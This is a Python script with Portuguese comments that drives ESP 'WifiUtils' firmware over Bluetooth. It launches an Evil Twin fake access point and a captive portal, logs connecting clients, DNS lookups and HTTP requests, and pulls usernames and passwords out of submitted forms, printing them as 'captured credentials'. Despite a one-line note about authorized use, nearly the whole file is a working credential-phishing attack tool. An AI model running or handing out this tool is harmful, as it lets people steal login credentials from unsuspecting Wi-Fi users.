#!/usr/bin/env python3
"""
Captive Portal completo via firmware WifiUtils.

Sobe Evil Twin + Captive Portal num único fluxo. Cada DNS query e HTTP
request emite TLV — script imprime em tempo real e detecta credenciais
de POST forms (username/password do form default).

ATENÇÃO: ESP precisa estar **NÃO conectado** como STA. Use apenas em
ambiente controlado / autorizado.

Uso:
    ~/.platformio/penv/bin/python scripts/captive_portal_test.py \\
        --ssid "FreeWifi" --channel 6 [--duration 180]

Ctrl+C pra encerrar (faz cleanup do AP + portal).
"""
import argparse
import asyncio
import json
import sys
import urllib.parse

from bleak import BleakClient, BleakScanner

SVC_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c01"
CMD_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c02"
STREAM_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c03"


async def find_target():
    print("→ scanning for WifiUtils-* device...")
    async with BleakScanner(service_uuids=[SVC_UUID]) as sc:
        await asyncio.sleep(5)
        for d in sc.discovered_devices:
            if (d.name or "").startswith("WifiUtils-"):
                return d
    return None


def decode_dns_query(payload: bytes) -> dict:
    if len(payload) < 5: return {}
    src = ".".join(str(b) for b in payload[0:4])
    dlen = payload[4]
    domain = payload[5:5 + dlen].decode("utf-8", errors="replace")
    return {"src": src, "domain": domain}


def decode_http_req(payload: bytes) -> dict:
    if len(payload) < 8: return {}
    src = ".".join(str(b) for b in payload[0:4])
    off = 4
    ml = payload[off]; off += 1
    method = payload[off:off + ml].decode("utf-8", errors="replace"); off += ml
    pl = payload[off]; off += 1
    path = payload[off:off + pl].decode("utf-8", errors="replace"); off += pl
    bl = int.from_bytes(payload[off:off + 2], "big"); off += 2
    body = payload[off:off + bl].decode("utf-8", errors="replace")
    return {"src": src, "method": method, "path": path, "body": body}


def detect_credentials(body: str) -> dict | None:
    """Procura username= / password= no body."""
    if not body or "=" not in body:
        return None
    try:
        parsed = urllib.parse.parse_qs(body)
    except Exception:
        return None
    keys_lower = {k.lower(): v for k, v in parsed.items()}
    user = (keys_lower.get("username") or keys_lower.get("user")
            or keys_lower.get("email") or keys_lower.get("login"))
    pwd = (keys_lower.get("password") or keys_lower.get("pwd")
           or keys_lower.get("pass"))
    if user and pwd:
        return {"user": user[0], "password": pwd[0]}
    return None


async def run(args):
    dev = await find_target()
    if not dev:
        print("✗ WifiUtils device not found"); sys.exit(2)
    print(f"→ connecting to {dev.address} ({dev.name})")

    async with BleakClient(dev) as client:
        creds = []
        clients = set()
        domains = set()

        def cmd_cb(_h, data):
            print(f"← cmd: {data.decode('utf-8', errors='replace')}")

        def stream_cb(_h, data):
            if len(data) < 4: return
            mtype = data[2]
            payload = bytes(data[4:])
            if mtype == 0x26:
                mac = ":".join(f"{b:02x}" for b in payload[0:6])
                clients.add(mac)
                print(f"  ↳ JOIN client mac={mac}")
            elif mtype == 0x27:
                mac = ":".join(f"{b:02x}" for b in payload[0:6])
                print(f"  ↳ LEAVE client mac={mac}")
            elif mtype == 0x2D:
                d = decode_dns_query(payload)
                domains.add(d['domain'])
                print(f"  DNS  {d['src']:>15}  {d['domain']}")
            elif mtype == 0x2E:
                r = decode_http_req(payload)
                body_show = r['body'][:80].replace('\n', ' ')
                print(f"  HTTP {r['src']:>15}  {r['method']} {r['path']}  body={body_show!r}")
                cred = detect_credentials(r['body'])
                if cred:
                    creds.append(cred)
                    print(f"\n  ✦ CREDENCIAIS CAPTURADAS ✦")
                    print(f"    user:     {cred['user']!r}")
                    print(f"    password: {cred['password']!r}\n")
            elif mtype == 0x00:
                pass
            else:
                print(f"  ?  type=0x{mtype:02x} ({len(payload)}B)")

        await client.start_notify(CMD_UUID, cmd_cb)
        await client.start_notify(STREAM_UUID, stream_cb)

        # 1) Evil Twin
        et = {"cmd": "evil_twin_start", "seq": 1,
              "ssid": args.ssid, "channel": args.channel}
        if args.password: et["password"] = args.password
        print(f"→ {json.dumps(et)}")
        await client.write_gatt_char(CMD_UUID, json.dumps(et).encode("utf-8"), response=True)
        await asyncio.sleep(1)

        # 2) Captive Portal
        cp = {"cmd": "captive_portal_start", "seq": 2}
        print(f"→ {json.dumps(cp)}")
        await client.write_gatt_char(CMD_UUID, json.dumps(cp).encode("utf-8"), response=True)

        print(f"\n→ Captive portal ativo por {args.duration}s. SSID: '{args.ssid}'")
        print(f"→ Conecte um device ao SSID e tente abrir qualquer site.\n")

        try:
            await asyncio.sleep(args.duration)
        except (KeyboardInterrupt, asyncio.CancelledError):
            print("\n→ interrompido")

        # Cleanup
        print("\n→ stopping captive_portal + evil_twin")
        await client.write_gatt_char(CMD_UUID,
            json.dumps({"cmd": "captive_portal_stop", "seq": 98}).encode("utf-8"),
            response=True)
        await asyncio.sleep(0.5)
        await client.write_gatt_char(CMD_UUID,
            json.dumps({"cmd": "evil_twin_stop", "seq": 99}).encode("utf-8"),
            response=True)
        await asyncio.sleep(1)

        print(f"\n=== Resumo ===")
        print(f"  Clients vistos:     {len(clients)}")
        print(f"  Domínios queriados: {len(domains)}")
        print(f"  Credenciais:        {len(creds)}")
        for c in creds:
            print(f"    - user={c['user']!r}  password={c['password']!r}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Evil Twin + Captive Portal completo via firmware WifiUtils.",
    )
    parser.add_argument("--ssid", required=True, help="SSID do AP fake")
    parser.add_argument("--channel", type=int, required=True, help="Canal (1–13)")
    parser.add_argument("--password", default="", help="WPA2 PSK (opcional, vazio=open)")
    parser.add_argument("--duration", type=int, default=180,
                        help="Duração total em segundos (default 180)")
    args = parser.parse_args()

    asyncio.run(run(args))
